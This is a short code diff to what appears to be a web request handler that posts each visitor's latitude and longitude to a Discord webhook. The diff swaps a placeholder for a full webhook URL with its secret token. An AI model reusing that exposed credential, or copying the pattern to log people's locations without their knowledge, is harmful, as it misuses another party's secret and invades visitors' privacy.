@@ -11,7 +11,7 @@ export async function onRequestPost({ request }) {
       content: `🌍 New visitor location:\nLatitude: ${lat}\nLongitude: ${lon}`
     };
 
-    await fetch("YOUR_WEBHOOK_URL", {
+    await fetch("https://discord.com/api/webhooks/1390808867226783775/JMh8swFZEZli3sqVhR13DkXddzqjipFqIInHgHRqCnSd9z9M_DGHd68mUZDsP0l4R3kY", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
